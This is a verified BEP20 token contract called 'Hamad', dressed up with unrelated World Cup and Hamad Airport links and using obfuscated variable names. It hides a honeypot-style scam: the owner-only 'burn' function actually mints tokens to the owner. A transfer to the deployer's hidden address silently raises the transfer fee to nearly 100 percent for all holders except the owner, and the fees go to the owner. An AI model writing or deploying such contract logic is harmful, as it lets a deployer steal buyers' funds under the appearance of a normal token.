/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 15:50 GMT
 */
////////////////////////////////////////////////////////////////////////////////////////
//Doha Hamad International Airport Arrivals Private Transfer worldcup2022
//https://twitter.com/ShakiraMedia
//https://www.facebook.com/HIAQatar/
//https://youtu.be/3849PZQVUG4
//https://dohahamadairport.com/
////////////////////////////////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract BNCVTQR {
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  HIWUIG = address(0);
uint256 private  KZBFOZ = 1000000000000000000000;
uint256 private  WZEKUV = 1000000000000000000;
string public  symbol = "Hamad";
address public owner;
uint256 public constant KZEHVX = 99999;
mapping (address => uint256) public balanceOf;
address private  HBGVTW = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address private  ARKQIR = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  RMSMMC = address(0);
uint256 private  TKLZRR = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  RFQUCL = 1000000000000000;
address private  REOSLS = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  XTKXMW = 10000000000000;
uint256 private  QUGYOW = 100000000;
string public  name = "Hamad";
uint256 private  BYEYJD = 10000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tYIWSLG 0");
require(spender != address(0), "fYIWSLG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getXTKXMW() private returns (uint256) {
return XTKXMW;
}

function _getRFQUCL() private returns (uint256) {
return RFQUCL;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getQUGYOW() private returns (uint256) {
return QUGYOW;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getKZBFOZ() private returns (uint256) {
return KZBFOZ;
}

function _getARKQIR() private returns (address) {
return ARKQIR;
}

function _getHIWUIG() private returns (address) {
return HIWUIG;
}

function _getBYEYJD() private returns (uint256) {
return BYEYJD;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getTKLZRR() private returns (uint256) {
return TKLZRR;
}

function _getHBGVTW() private returns (address) {
return HBGVTW;
}

function _getREOSLS() private returns (address) {
return REOSLS;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "YIWSLG");
require(to != address(0), "YIWSLG");
require(amount <= balanceOf[from], "YIWSLG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KZEHVX/WZEKUV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==RMSMMC){
WZEKUV = KZEHVX+2;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
RMSMMC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}